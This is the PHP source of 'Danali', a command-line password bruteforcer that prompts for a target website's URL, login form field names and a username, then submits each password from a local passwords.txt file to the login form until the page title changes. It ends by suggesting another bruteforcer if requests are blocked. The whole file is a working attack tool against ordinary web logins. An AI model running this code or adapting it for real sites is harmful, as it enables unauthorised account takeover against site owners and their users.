<?php
/**
 * @package Danali - PHP bruteforcer
 * @author Fahad Yousaf Mahar <fahadyousafmahar@gmail.com>
 * @license MIT
 * @copyright 2019 StalkersSecurity 
 * @link https://stalkers.pk
 * 
 */
include 'colors.php';
include 'logo.php';
$cli = new Colors();
$header = $cli->getColoredString($gun,"cyan")."\n".$cli->getColoredString($logo,"cyan");
echo $header;

$prompt = $cli->getColoredString(" Enter ","cyan")
         .$cli->getColoredString("URL ","white")
         .$cli->getColoredString("address of ","cyan")
         .$cli->getColoredString("Target ","light_green")
         .$cli->getColoredString("website : ","cyan");

echo $prompt;
$url = trim(fgets(STDIN));

$prompt = $cli->getColoredString(" Enter ","cyan")
         .$cli->getColoredString("name ","white")
         .$cli->getColoredString("property of ","cyan")
         .$cli->getColoredString("Username ","light_green")
         .$cli->getColoredString("field : ","cyan");

echo $prompt;
$userField = trim(fgets(STDIN));

$prompt = $cli->getColoredString(" Enter ","cyan")
         .$cli->getColoredString("name ","white")
         .$cli->getColoredString("property of ","cyan")
         .$cli->getColoredString("Password ","light_green")
         .$cli->getColoredString("field : ","cyan");

echo $prompt;
$passwordField = trim(fgets(STDIN));

$prompt = $cli->getColoredString(" Enter ","cyan")
         .$cli->getColoredString("name ","white")
         .$cli->getColoredString("property of ","cyan")
         .$cli->getColoredString("Submit ","light_green")
         .$cli->getColoredString("button : ","cyan");

echo $prompt;
$submitField = trim(fgets(STDIN));
echo "+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n"; 

$prompt = $cli->getColoredString(" Enter ","cyan")
         .$cli->getColoredString("Username ","white")
         .$cli->getColoredString("for ","cyan")
         .$cli->getColoredString("bruteforcing ","light_red")
         .$cli->getColoredString("website : ","cyan");

echo $prompt;
$username = trim(fgets(STDIN));


/**
 * Entering Curl
 */

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT,"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)");
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
$response = curl_exec($ch);
if (curl_error($ch)){
    die('Unable to connect: ' . curl_errno($ch) . ' - ' . curl_error($ch));
}
curl_close($ch);

$matchesAfter = [];
$matchesBefore = [];
preg_match('/<title>(.*?)<\/title>/i',$response,$matchesBefore);

$file = fopen("passwords.txt","r");

do {

    if(feof($file)){
        echo $cli->getColoredString("Password not found. Password list ended.","cyan");
        exit;
    }else{
        $password = trim(fgets($file));
    }
        echo $cli->getColoredString("\t\t Trying -> ","white")
             .$cli->getColoredString("$password\n","light_red");
    $postfields = array(
        $userField => $username,
        $passwordField => $password,
        $submitField => "1"
    );
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_USERAGENT,"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postfields));
    $respons = curl_exec($ch);
    if (curl_error($ch)){
        die('Unable to connect: ' . curl_errno($ch) . ' - ' . curl_error($ch));
    }
    curl_close($ch);
    preg_match('/<title>(.*?)<\/title>/i',$respons,$matchesAfter);

} while ($matchesAfter[1] == $matchesBefore[1]);
if($matchesAfter[1] != $matchesBefore[1]){
    echo "+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n"; 
    echo $cli->getColoredString("Password Found :","cyan").
         $cli->getColoredString($password."\n","light_green").
         $cli->getColoredString("Or Request was blocked. Use [ github.com/Ahmad-Ishaq/AK-47-Bruteforcer ] if request is blocked","red");

}

